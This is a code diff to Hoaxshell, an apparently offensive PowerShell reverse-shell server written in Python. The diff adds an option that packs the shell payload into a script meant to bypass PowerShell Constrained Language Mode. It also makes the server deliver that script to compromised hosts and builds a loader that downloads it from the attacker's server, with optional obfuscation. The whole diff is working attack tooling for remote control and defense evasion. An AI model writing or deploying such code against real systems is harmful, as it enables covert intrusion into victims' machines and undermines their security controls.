@@ -5,6 +5,7 @@
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import ssl, sys, argparse, base64, gnureadline, uuid, re
+import os
 from os import system, path
 from warnings import filterwarnings
 from datetime import date, datetime
@@ -106,6 +107,7 @@ parser.add_argument("-lt", "--localtunnel", action="store_true", help="Generate 
 parser.add_argument("-ng", "--ngrok", action="store_true",help="Generate Payload with Ngrok")
 parser.add_argument("-u", "--update", action="store_true", help = "Pull the latest version from the original repo.")
 parser.add_argument("-q", "--quiet", action="store_true", help = "Do not print the banner on startup.")
+parser.add_argument("-clm", "--bypass-clm", action="store_true", help = "Pack Payload to bypass_clm.ps1")
 
 args = parser.parse_args()
 
@@ -373,6 +375,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 	verify = str(uuid.uuid4())[0:8]
 	get_cmd = str(uuid.uuid4())[0:8]
 	post_res = str(uuid.uuid4())[0:8]
+	load_clm = str(uuid.uuid4())[0:8]
 	hid = str(uuid.uuid4()).split("-")
 	header_id = f'X-{hid[0][0:4]}-{hid[1]}' if not args.Header else args.Header
 	SESSIONID = '-'.join([verify, get_cmd, post_res])
@@ -445,6 +448,7 @@ class Hoaxshell(BaseHTTPRequestHandler):
 				Hoaxshell.verify = h[0]
 				Hoaxshell.get_cmd = h[1]
 				Hoaxshell.post_res = h[2]
+				Hoaxshell.load_clm = h[3]
 				Hoaxshell.SESSIONID = session_id
 				Hoaxshell.restored = True
 				Hoaxshell.execution_verified = True
@@ -497,6 +501,16 @@ class Hoaxshell(BaseHTTPRequestHandler):
 
 			Hoaxshell.last_received = timestamp
 
+		# Get file
+		elif self.path == f'/{Hoaxshell.load_clm}' and legit and Hoaxshell.execution_verified:
+			self.send_response(200)
+			self.send_header('Content-type', 'text/javascript; charset=UTF-8')
+			self.send_header('Access-Control-Allow-Origin', '*')
+			self.end_headers()
+			cwd = path.dirname(path.abspath(__file__))
+			filecontent = (open(f'{cwd}/server_files/bypass_clm_payload.ps1', 'r')).read()
+   
+			self.wfile.write(bytes(filecontent, "utf-8"))
 
 		else:
 			self.send_response(200)
@@ -752,6 +766,34 @@ def main():
 					
 					payload = payload.replace(var, f'${obf}')
 			
+			if args.bypass_clm:
+				# Pack origin payload to bypass_clm_payload.ps1
+				payload = payload.replace('"', '\'')
+				bypass_clm_payload = (open(f'{cwd}/payload_templates/bypass_clm_payload.ps1', 'r') if not args.exec_outfile else open(f'{cwd}/payload_templates/bypass_clm_payload.ps1', 'r')).read()
+				bypass_clm_payload = bypass_clm_payload.replace('*PSRAW*', payload)
+				if not os.path.isdir(f'{cwd}/server_files'):
+					os.mkdir(f'{cwd}/server_files')
+
+				(open(f'{cwd}/server_files/bypass_clm_payload.ps1', 'w')).write(bypass_clm_payload)
+
+				# Create new payload to load bypass_clm_payload.ps1
+				payload = (open(f'{cwd}/payload_templates/load_clm.ps1', 'r')).read().strip()
+				payload = payload.replace('*SERVERIP*', (t_server if (args.localtunnel or args.ngrok) else server_ip))
+				payload = payload.replace('*SESSIONID*', Hoaxshell.SESSIONID)
+				payload = payload.replace('*FREQ*', str(frequency))
+				payload = payload.replace('*VERIFY*', Hoaxshell.verify)
+				payload = payload.replace('*GETCMD*', Hoaxshell.load_clm)
+				payload = payload.replace('*POSTRES*', Hoaxshell.post_res)
+				payload = payload.replace('*HOAXID*', Hoaxshell.header_id)
+				
+				if args.obfuscate:
+					for var in ['$s', '$i', '$p', '$v']:
+						
+						_max = randint(1,5)
+						obf = str(uuid.uuid4())[0:_max]
+						
+						payload = payload.replace(var, f'${obf}')
+
 			if not args.raw_payload:
 				payload = encodePayload(payload)
 
